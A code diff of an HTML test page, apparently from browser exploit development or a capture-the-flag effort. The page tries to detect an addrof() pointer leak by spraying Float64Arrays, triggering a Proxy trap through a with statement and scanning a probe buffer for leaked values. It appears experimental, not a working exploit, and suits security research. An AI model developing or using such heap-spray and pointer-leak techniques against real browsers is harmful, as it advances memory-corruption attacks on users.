@@ -1,24 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ProxyObject addrof() Detection</title>
+    <title>ProxyObject addrof() Detection v2</title>
     <script>
         function log(msg) {
             document.body.innerHTML += msg + "<br>";
         }
 
         window.onload = () => {
-            log("Starting ProxyObject addrof() detection...");
+            log("Starting ProxyObject pointer leak test...");
 
             // Object we want to find the address of
             const victim = { secret: "flag{exploit_dev_in_progress}" };
 
-            // Heap spray to increase odds of overlap
+            // Spray Float64Arrays to increase chance of overlap
             const sprayCount = 1000;
             let spray = [];
             for (let i = 0; i < sprayCount; i++) {
-                spray.push({ obj: victim });
+                spray.push(new Float64Array(4));
             }
+
+            // Add one special array we'll inspect manually
+            const probe = new Float64Array(10);
+            spray.push(probe);
 
             let callCount = 0;
 
@@ -32,19 +36,12 @@
                     log("Proxy 'get' called (" + callCount + ")");
                     log("prop = " + prop);
 
-                    // Log receiver type
-                    log("Receiver = " + receiver);
-                    log("Receiver.constructor = " + (receiver?.constructor?.name || "unknown"));
-
-                    // Try to extract any field that looks like a pointer
+                    // Try to inspect receiver deeply
                     try {
                         for (let key in receiver) {
                             try {
                                 const val = receiver[key];
                                 log(`receiver.${key} = ${typeof val} (${val})`);
-                                if (typeof val === "object" && val !== null) {
-                                    log(`  -> object keys: ${Object.keys(val).join(", ")}`);
-                                }
                             } catch (e) {
                                 log(`Error reading receiver.${key}: ${e.message}`);
                             }
@@ -63,7 +60,7 @@
             (function () {
                 with (proxy) {
                     try {
-                        // Access a property to trigger Proxy trap
+                        // Access any property to trigger Proxy trap
                         log("Accessing 'toString'...");
                         toString(); // Could be any property access
                     } catch (e) {
@@ -71,11 +68,20 @@
                     }
                 }
             })();
+
+            // After exploit, scan probe array for leaked pointers
+            log("Scanning probe buffer for leaked values:");
+            for (let i = 0; i < probe.length; i++) {
+                let val = probe[i];
+                if (val !== 0 && !isNaN(val)) {
+                    log(`probe[${i}] = ${val} (0x${val.toString(16)})`);
+                }
+            }
         };
     </script>
 </head>
 <body>
-    <h2>ProxyObject addrof() Detection Test</h2>
-    <p>Trying to observe leaked pointers or internal object fields.</p>
+    <h2>ProxyObject Pointer Leak Test v2</h2>
+    <p>Detecting potential leaked pointers using TypedArray heap spraying.</p>
 </body>
 </html>
